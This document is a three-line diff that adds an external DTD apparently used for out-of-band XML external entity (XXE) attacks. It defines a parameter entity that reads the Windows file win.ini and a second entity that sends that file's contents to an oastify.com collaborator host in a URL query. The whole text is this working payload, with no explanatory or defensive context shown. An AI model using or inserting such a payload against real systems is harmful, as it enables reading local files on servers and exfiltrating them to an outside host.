@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://bgv1bx1kglkek4ddkp3uehvzwq2jq8.oastify.com/?exfil=%file;'>">
+%all;
